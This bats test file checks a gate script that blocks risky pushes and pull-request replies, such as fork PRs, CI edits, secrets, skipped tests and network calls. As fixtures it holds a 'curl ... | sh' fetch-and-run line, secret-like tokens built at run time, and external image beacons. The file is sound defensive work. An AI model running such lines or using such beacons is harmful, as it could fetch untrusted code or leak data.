#!/usr/bin/env bats
# Tests for gate.sh. Each case builds a bare "GitHub" repository and a clone under a temp directory,
# serves the pull request from a stub pr-state, and answers the gate's two REST reads from a stub gh,
# so no test calls GitHub. A secret-like fixture is assembled at run time so no literal one is committed.
# shellcheck disable=SC2292 # bats fails a test on a mid-test `[[ ]]` only under bash 4.1+; `[ ]` works on every bash.

setup() {
  scripts="${BATS_TEST_DIRNAME}"
  gate="${scripts}/gate.sh"
  tmp="${BATS_TEST_TMPDIR}"
  token="tok-1"

  # Keep the developer's own Git configuration out of every case.
  export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
  export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.invalid GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.invalid
  export BABYSIT_REMOTE_BASE="file://${tmp}/srv"
  export BABYSIT_PR_STATE="${tmp}/pr-state"

  mkdir -p "${tmp}/srv/o" "${tmp}/bin"
  git init -q --bare -b main "${tmp}/srv/o/r.git"
  git init -q --bare -b main "${tmp}/srv/o/other.git"
  git clone -q "file://${tmp}/srv/o/r.git" "${tmp}/wt" 2>/dev/null
  cd "${tmp}/wt" || return 1
  git switch -q -c main
  printf 'base\n' >app.txt
  git add -- app.txt
  git commit -q -m base
  git push -q origin main
  git switch -q -c feat/x
  printf 'feature\n' >feature.txt
  git add -- feature.txt
  git commit -q -m feature
  git push -q origin feat/x
  start="$(git rev-parse HEAD)"

  # The pull request as pr-state would print it.
  clean='{"repo":"o/r","number":7,"url":"https://github.com/o/r/pull/7","state":"OPEN","isDraft":false,
    "author":"me","viewer":"me","isCrossRepository":false,"baseRef":"main","headRef":"feat/x","head":"aaa"}'
  set_snap '.'
  printf '#!/usr/bin/env bash\n[ -e "%s/pr-state-fails" ] && exit 1\ncat "%s/snap.json"\n' "${tmp}" "${tmp}" >"${tmp}/pr-state"
  chmod +x "${tmp}/pr-state"

  # gh serves the repository (default branch) and the branch (protected flag).
  printf '{"default_branch":"main"}\n' >"${tmp}/repo.json"
  printf '{"protected":false}\n' >"${tmp}/branch.json"
  cat >"${tmp}/bin/gh" <<EOF
#!/usr/bin/env bash
[ -e "${tmp}/gh-fails" ] && exit 1
case "\$*" in
*/branches/*) cat "${tmp}/branch.json" ;;
*) cat "${tmp}/repo.json" ;;
esac
EOF
  chmod +x "${tmp}/bin/gh"
  export PATH="${tmp}/bin:${PATH}"

  bash "${scripts}/ledger.sh" start o/r 7 "${token}" >/dev/null
}

# Writes the clean pull request after the jq edit $1.
set_snap() {
  jq -c "$1" <<<"${clean}" >"${tmp}/snap.json"
}

# Commits a file with the content $2 and message $3 in the clone.
commit_file() {
  mkdir -p "$(dirname "$1")"
  printf '%s\n' "$2" >"$1"
  git add -- "$1"
  git commit -q -m "${3:-change}"
}

# Runs the gate for a push whose command is the one it would verify for HEAD.
gate_push() {
  run_gate git push origin "$(git rev-parse HEAD):refs/heads/feat/x"
}

# Runs the gate for a push with the command given as arguments.
run_gate() {
  run bash "${gate}" push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}" -- "$@"
}

field() {
  jq -r "$1" <<<"${output}"
}

expect() {
  if [ "$1" != "$2" ]; then
    echo "expected [$2], got [$1]; output: ${output}" >&2
    return 1
  fi
}

# Expects a refuse verdict whose reason contains $1.
expect_refuse() {
  expect "${status}" 11
  expect "$(field .verdict)" refuse
  [[ "$(field .reason)" == *"$1"* ]] || {
    echo "reason [$(field .reason)] lacks [$1]" >&2
    return 1
  }
}

# Pushes HEAD to the remote branch and makes it the new start, as a session that began from it would.
publish() {
  git push -q origin HEAD:refs/heads/feat/x
  start="$(git rev-parse HEAD)"
}

# Expects a park verdict with a match of category $1, and of path $2 when given.
expect_park() {
  expect "${status}" 10
  expect "$(field .verdict)" park
  jq -e --arg c "$1" --arg p "${2:-}" \
    '.matches | any(.category == $c and ($p == "" or .path == $p))' <<<"${output}" >/dev/null || {
    echo "no [$1] match for [${2:-any path}]; output: ${output}" >&2
    return 1
  }
}

# Strings that look like secrets, assembled here so no literal one is committed.
github_token() {
  printf 'gh%s%s' 'p_' "$(printf 'A%.0s' $(seq 1 36))"
}
aws_key() {
  printf 'AK%s%s' 'IA' "$(printf 'B%.0s' $(seq 1 16))"
}

# Commits a file to the base branch, publishes it, and returns to the feature branch.
base_commit() {
  git switch -q main
  commit_file "$1" "$2" "base change"
  git push -q origin main
  git switch -q feat/x
}

# Runs the gate for a reply with the body $1.
gate_reply() {
  printf '%s\n' "$1" >"${tmp}/body.txt"
  run bash "${gate}" reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt"
}

# Expects exit 2 with a usage message for the gate arguments given.
expect_usage() {
  run bash "${gate}" "$@"
  expect "${status}" 2
  [[ "${output}" == *"Usage:"* ]] || {
    echo "no usage message for [$*]; output: ${output}" >&2
    return 1
  }
}

@test "rejects bad arguments with exit 2 and a usage message" {
  expect_usage
  expect_usage bogus o/r 7
  expect_usage push noslash 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}" -- git push
  expect_usage push o/r 0 --session "${token}" --worktree "${tmp}/wt" --start "${start}" -- git push
  expect_usage push o/r 7 --worktree "${tmp}/wt" --start "${start}" -- git push
  expect_usage push o/r 7 --session "bad token" --worktree "${tmp}/wt" --start "${start}" -- git push
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" -- git push
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start nothex -- git push
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}"
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/missing" --start "${start}" -- git push
  expect_usage push o/r 7 --session "${token}" --start "${start}" -- git push
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}" --unknown -- git push
}

@test "exits 3 when another session holds the lock" {
  commit_file src.txt fix
  run bash "${gate}" push o/r 7 --session other-session --worktree "${tmp}/wt" --start "${start}" -- \
    git push origin "$(git rev-parse HEAD):refs/heads/feat/x"
  [ "${status}" -eq 3 ]
}

@test "exits 3 when the lock was cleared" {
  commit_file src.txt fix
  bash "${scripts}/ledger.sh" stop o/r 7 "${token}"
  gate_push
  [ "${status}" -eq 3 ]
}

@test "allows an ordinary fix pushed as a fast-forward of the verified commit" {
  commit_file src.txt "return 1"
  gate_push
  expect "${status}" 0
  expect "$(field .verdict)" allow
  expect "$(field .head)" "$(git rev-parse HEAD)"
  expect "$(field .branch)" feat/x
  expect "$(field .start)" "${start}"
}

@test "refuses a pull request from a fork" {
  commit_file src.txt fix
  set_snap '.isCrossRepository = true'
  gate_push
  expect_refuse fork
}

@test "refuses a pull request when the cross-repository flag is unreadable" {
  commit_file src.txt fix
  set_snap 'del(.isCrossRepository)'
  gate_push
  expect_refuse fork
}

@test "refuses a pull request authored by someone else" {
  commit_file src.txt fix
  set_snap '.author = "mallory"'
  gate_push
  expect_refuse author
}

@test "refuses a pull request without a known author" {
  commit_file src.txt fix
  set_snap '.author = null'
  gate_push
  expect_refuse author
}

@test "refuses a closed pull request" {
  commit_file src.txt fix
  set_snap '.state = "CLOSED"'
  gate_push
  expect_refuse open
}

@test "refuses a merged pull request" {
  commit_file src.txt fix
  set_snap '.state = "MERGED"'
  gate_push
  expect_refuse open
}

@test "refuses a pull request whose snapshot is for another repository" {
  commit_file src.txt fix
  set_snap '.repo = "o/elsewhere"'
  gate_push
  expect_refuse "another pull request"
}

@test "refuses when the head branch is the default branch" {
  git switch -q main
  local main_tip
  main_tip="$(git rev-parse HEAD)"
  commit_file src.txt fix
  set_snap '.headRef = "main"'
  run bash "${gate}" push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${main_tip}" -- \
    git push origin "$(git rev-parse HEAD):refs/heads/main"
  expect_refuse "default branch"
}

@test "refuses when the head branch is protected" {
  commit_file src.txt fix
  printf '{"protected":true}\n' >"${tmp}/branch.json"
  gate_push
  expect_refuse protected
}

@test "refuses when the branch cannot be read from GitHub" {
  commit_file src.txt fix
  : >"${tmp}/gh-fails"
  gate_push
  expect_refuse "could not"
}

@test "refuses when the pull request cannot be read" {
  commit_file src.txt fix
  : >"${tmp}/pr-state-fails"
  gate_push
  expect_refuse "could not"
}

@test "refuses when the remote head has moved ahead of the start" {
  commit_file src.txt fix
  git clone -q "file://${tmp}/srv/o/r.git" "${tmp}/other" 2>/dev/null
  (
    cd "${tmp}/other" || exit 1
    git switch -q feat/x
    printf 'theirs\n' >theirs.txt
    git add -- theirs.txt
    git commit -q -m theirs
    git push -q origin feat/x
  )
  gate_push
  expect_refuse "moved"
}

@test "refuses when the remote branch does not exist" {
  commit_file src.txt fix
  git push -q origin --delete feat/x
  gate_push
  expect_refuse "moved"
}

@test "refuses when there is nothing new to push" {
  gate_push
  expect_refuse "nothing"
}

@test "refuses when the start commit is not an ancestor of HEAD" {
  commit_file src.txt fix
  git reset -q --hard "${start}^"
  gate_push
  expect_refuse "descend"
}

@test "refuses when origin fetches from another repository" {
  commit_file src.txt fix
  git remote set-url origin "file://${tmp}/srv/o/other.git"
  gate_push
  expect_refuse origin
}

@test "refuses when origin pushes to another repository" {
  commit_file src.txt fix
  git remote set-url --push origin "file://${tmp}/srv/o/other.git"
  gate_push
  expect_refuse origin
}

@test "refuses when a rewrite rule sends the push elsewhere" {
  commit_file src.txt fix
  git config "url.file://${tmp}/srv/o/other.git.pushInsteadOf" "file://${tmp}/srv/o/r.git"
  gate_push
  expect_refuse origin
}

@test "refuses a push command that differs from the verified one" {
  commit_file src.txt fix
  head="$(git rev-parse HEAD)"
  other="$(git rev-parse HEAD^)"
  local -a variants=(
    "git push --force origin ${head}:refs/heads/feat/x"
    "git push --force-with-lease=refs/heads/feat/x:${start} origin ${head}:refs/heads/feat/x"
    "git push origin +${head}:refs/heads/feat/x"
    "git push origin HEAD:refs/heads/feat/x"
    "git push origin ${head}:refs/heads/main"
    "git push origin ${other}:refs/heads/feat/x"
    "git push origin ${head}:refs/heads/feat/x --no-verify"
    "git push upstream ${head}:refs/heads/feat/x"
    "git push origin"
  )
  for variant in "${variants[@]}"; do
    # shellcheck disable=SC2086 # the variant is split into words on purpose.
    run_gate ${variant}
    echo "variant: ${variant}" >&2
    expect_refuse "command"
  done
}

@test "prints exactly one JSON line for a refusal" {
  commit_file src.txt fix
  set_snap '.state = "CLOSED"'
  gate_push
  expect "$(wc -l <<<"${output}" | tr -d ' ')" 1
  jq -e 'has("verdict") and has("reason")' <<<"${output}" >/dev/null
}

@test "parks a change to CI and execution configuration" {
  local entry
  for entry in .github/workflows/ci.yml .gitlab-ci.yml .circleci/config.yml Makefile rules.mk sub/Dockerfile \
    compose.yaml prek.toml .husky/pre-commit .claude/settings.json AGENTS.md; do
    git reset -q --hard "${start}"
    commit_file "${entry}" "content"
    gate_push
    expect_park ci "${entry}"
  done
}

@test "parks the deletion of a CI file" {
  commit_file .github/workflows/ci.yml "name: ci"
  publish
  git rm -q .github/workflows/ci.yml
  git commit -q -m "drop ci"
  gate_push
  expect_park ci .github/workflows/ci.yml
}

@test "parks a change to dependencies" {
  local entry
  for entry in package.json package-lock.json yarn.lock pnpm-lock.yaml go.mod go.sum Cargo.lock pyproject.toml \
    requirements-dev.txt Gemfile.lock .gitmodules vendor/lib.go web/vendor/x.js; do
    git reset -q --hard "${start}"
    commit_file "${entry}" "content"
    gate_push
    expect_park deps "${entry}"
  done
}

@test "parks a moved submodule pointer" {
  git update-index --add --cacheinfo "160000,${start},sub"
  git commit -q -m "bump sub"
  gate_push
  expect_park deps sub
}

@test "parks a moved submodule pointer even when the submodule file tells Git to ignore it" {
  git update-index --add --cacheinfo "160000,${start},sub"
  printf '[submodule "sub"]\n\tpath = sub\n\turl = https://example.invalid/x.git\n\tignore = all\n' >.gitmodules
  git add -- .gitmodules
  git commit -q -m "add sub"
  publish
  git update-index --cacheinfo "160000,$(git rev-parse main),sub"
  git commit -q -m "move only the pointer"
  gate_push
  expect_park deps sub
}

@test "parks the deletion of a test file" {
  commit_file tests/login_test.go "func TestLogin() {}"
  publish
  git rm -q tests/login_test.go
  git commit -q -m "drop test"
  gate_push
  expect_park tests tests/login_test.go
}

@test "parks an added skip or focus in a test" {
  local entry path line
  for entry in "a.test.js|it.skip('x', () => {})" "a.test.js|describe.only('x', () => {})" \
    "a.spec.ts|xit('x', () => {})" "a_test.py|@pytest.mark.skip" "a_test.py|pytest.skip('later')" \
    "a_test.go|t.Skip(\"later\")" "a.bats|  skip" "a_spec.rb|  xit 'x' do" "A.java|@Disabled"; do
    path="${entry%%|*}"
    line="${entry#*|}"
    git reset -q --hard "${start}"
    commit_file "${path}" "${line}"
    gate_push
    expect_park tests "${path}"
  done
}

@test "parks an added coverage threshold" {
  commit_file .coveragerc "fail_under = 10"
  gate_push
  expect_park tests .coveragerc
}

@test "parks a test case that was removed from a test file" {
  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2\n\ndef test_sub():\n    assert sub(2, 1) == 1'
  publish
  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2'
  gate_push
  expect_park tests calc_test.py
}

@test "parks a secret in added text" {
  local entry path content
  for entry in "key.txt|-----BEGIN RSA ""PRIVATE KEY-----" "gh.txt|$(github_token)" "aws.txt|$(aws_key)" \
    "cfg.js|const API_TOKEN = 'abcdefgh12345'" "cfg.py|password: \"hunter2hunter2\""; do
    path="${entry%%|*}"
    content="${entry#*|}"
    git reset -q --hard "${start}"
    commit_file "${path}" "${content}"
    gate_push
    expect_park secrets "${path}"
  done
}

@test "parks a file that is named like a secret" {
  local entry
  for entry in "$(printf '.%s' env)" "$(printf '.%s.production' env)" certs/server.pem id_rsa config/credentials.json; do
    git reset -q --hard "${start}"
    commit_file "${entry}" "X=1"
    gate_push
    expect_park secrets "${entry}"
  done
}

@test "parks a secret that an earlier commit added and a later commit removed" {
  commit_file leak.txt "$(github_token)"
  git rm -q leak.txt
  git commit -q -m "remove it again"
  gate_push
  expect_park secrets leak.txt
}

@test "parks a secret in a commit message" {
  commit_file src.txt fix "fix with $(github_token)"
  gate_push
  expect_park secrets "commit message"
}

@test "parks outbound network access" {
  local entry path line
  for entry in "run.sh|curl -s example.invalid" "doc.md|see https://example.invalid/x" "a.js|fetch('/api')" \
    "a.py|requests.get(url)" "a.go|http.Get(url)" "a.js|new XMLHttpRequest()"; do
    path="${entry%%|*}"
    line="${entry#*|}"
    git reset -q --hard "${start}"
    commit_file "${path}" "${line}"
    gate_push
    expect_park network "${path}"
  done
}

@test "parks a binary file it cannot read" {
  printf '\000\001\002' >image.bin
  git add -- image.bin
  git commit -q -m "add image"
  gate_push
  expect_park binary image.bin
}

@test "parks a path with a control character" {
  commit_file $'odd\nname.txt' content
  gate_push
  expect_park path
}

@test "lists every matched category, each once" {
  commit_file .github/workflows/ci.yml "name: ci"
  commit_file package.json "{}"
  commit_file run.sh "curl example.invalid"
  gate_push
  expect_park ci
  expect_park deps
  expect_park network
}

@test "refuses before parking when an allow condition fails" {
  commit_file .github/workflows/ci.yml "name: ci"
  set_snap '.isCrossRepository = true'
  gate_push
  expect_refuse fork
}

@test "allows a new test file, an edited test, a removed source file, and a docs change" {
  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2'
  publish
  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2\n    assert add(2, 2) == 4\n\ndef test_sub():\n    assert sub(2, 1) == 1'
  commit_file docs/guide.md "Run the tests with make test."
  git rm -q feature.txt
  git commit -q -m "drop unused file"
  gate_push
  expect "${status}" 0
  expect "$(field .verdict)" allow
}

@test "allows an edit that replaces one test case with another" {
  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2'
  publish
  commit_file calc_test.py $'def test_plus():\n    assert add(1, 1) == 2'
  gate_push
  expect "${status}" 0
}

@test "allows a merge of the base even when the base brings in a workflow and a lockfile" {
  base_commit .github/workflows/ci.yml "name: base ci"
  base_commit package-lock.json "{}"
  git merge -q --no-ff -m "merge main" main
  gate_push
  expect "${status}" 0
  expect "$(field .verdict)" allow
}

@test "allows a merge of the base when the base has moved on since the merge" {
  base_commit .github/workflows/ci.yml "name: base ci"
  git merge -q --no-ff -m "merge main" main
  base_commit docs.md "later"
  gate_push
  expect "${status}" 0
}

@test "inspects a merge of a branch other than the base in full" {
  git switch -q -c other main
  commit_file .github/workflows/ci.yml "name: other ci"
  git switch -q feat/x
  git merge -q --no-ff -m "merge other" other
  gate_push
  expect_park ci .github/workflows/ci.yml
}

@test "inspects a merge of the base followed by another commit in full" {
  base_commit .github/workflows/ci.yml "name: base ci"
  git merge -q --no-ff -m "merge main" main
  commit_file src.txt fix
  gate_push
  expect_park ci .github/workflows/ci.yml
}

@test "parks a merge of the base whose conflict is in a hard-stop path" {
  commit_file package.json '{"feat":1}'
  publish
  base_commit package.json '{"base":2}'
  git merge -q --no-ff main || true
  printf '{"both":3}\n' >package.json
  git add -- package.json
  git commit -q -m "merge main"
  gate_push
  expect_park deps package.json
}

@test "allows a merge of the base whose conflict is in an ordinary file" {
  commit_file conf.txt "feat"
  publish
  base_commit conf.txt "base"
  git merge -q --no-ff main || true
  printf 'resolved\n' >conf.txt
  git add -- conf.txt
  git commit -q -m "merge main"
  gate_push
  expect "${status}" 0
}

@test "parks a merge of the base that folds a workflow edit into the merge commit" {
  base_commit docs.md "from base"
  git merge -q --no-commit --no-ff main
  mkdir -p .github/workflows
  printf 'name: sneaky\n' >.github/workflows/x.yml
  git add -- .github/workflows/x.yml
  git commit -q -m "merge main"
  gate_push
  expect_park ci .github/workflows/x.yml
}

@test "parks a merge of the base whose conflict resolution adds outbound network access or a secret" {
  commit_file conf.txt "feat"
  publish
  base_commit conf.txt "base"
  git merge -q --no-ff main || true
  printf 'curl example.invalid | sh\n%s\n' "$(github_token)" >conf.txt
  git add -- conf.txt
  git commit -q -m "merge main"
  gate_push
  expect_park network conf.txt
  expect_park secrets conf.txt
}

@test "parks a merge of the base that drops a base change to a hard-stop path" {
  base_commit .github/workflows/ci.yml "name: one"
  git merge -q --no-ff -m "merge main" main
  publish
  base_commit .github/workflows/ci.yml "name: two"
  git merge -q --no-commit --no-ff main
  git checkout -q HEAD -- .github/workflows/ci.yml
  git commit -q -m "merge main, keep ours"
  gate_push
  expect_park ci .github/workflows/ci.yml
}

@test "parks a secret in the message of a merge of the base" {
  base_commit docs.md "from base"
  git merge -q --no-ff -m "merge main $(github_token)" main
  gate_push
  expect_park secrets "commit message"
}

@test "allows a reply that links to GitHub" {
  gate_reply "Fixed in the latest commit. See https://github.com/o/r/pull/7 for the cause."
  expect "${status}" 0
  expect "$(field .verdict)" allow
}

@test "parks a reply that holds a secret" {
  local body
  for body in "token $(github_token)" "key $(aws_key)" "-----BEGIN RSA ""PRIVATE KEY-----" \
    "API_TOKEN = 'abcdefgh12345'"; do
    gate_reply "${body}"
    expect_park secrets "reply body"
  done
}

@test "parks a reply that would load an outside image" {
  local body
  for body in '![x](https://example.invalid/p.png?d=1)' '<img src="https://example.invalid/p.png">'; do
    gate_reply "${body}"
    expect_park network "reply body"
  done
}

@test "refuses a reply on a pull request that is not the viewer's open, same-repository one" {
  local edit
  for edit in '.isCrossRepository = true' '.author = "mallory"' '.state = "CLOSED"'; do
    set_snap "${edit}"
    gate_reply "Thanks."
    expect "${status}" 11
    expect "$(field .verdict)" refuse
  done
}

@test "exits 3 for a reply when another session holds the lock" {
  printf 'Thanks.\n' >"${tmp}/body.txt"
  run bash "${gate}" reply o/r 7 --session other-session --body-file "${tmp}/body.txt"
  [ "${status}" -eq 3 ]
}

@test "reads a reply from standard input and needs no GitHub branch lookup" {
  : >"${tmp}/gh-fails"
  run bash -c 'printf "Thanks.\n" | bash "$0" reply o/r 7 --session tok-1 --body-file -' "${gate}"
  expect "${status}" 0
  expect "$(field .verdict)" allow
}

@test "rejects a reply call with the wrong arguments" {
  gate_reply "Thanks."
  expect "${status}" 0
  expect_usage reply o/r 7 --session "${token}"
  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/missing.txt"
  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt" --start "${start}"
  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt" --worktree "${tmp}/wt"
  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}" --body-file "${tmp}/body.txt" -- git push
}
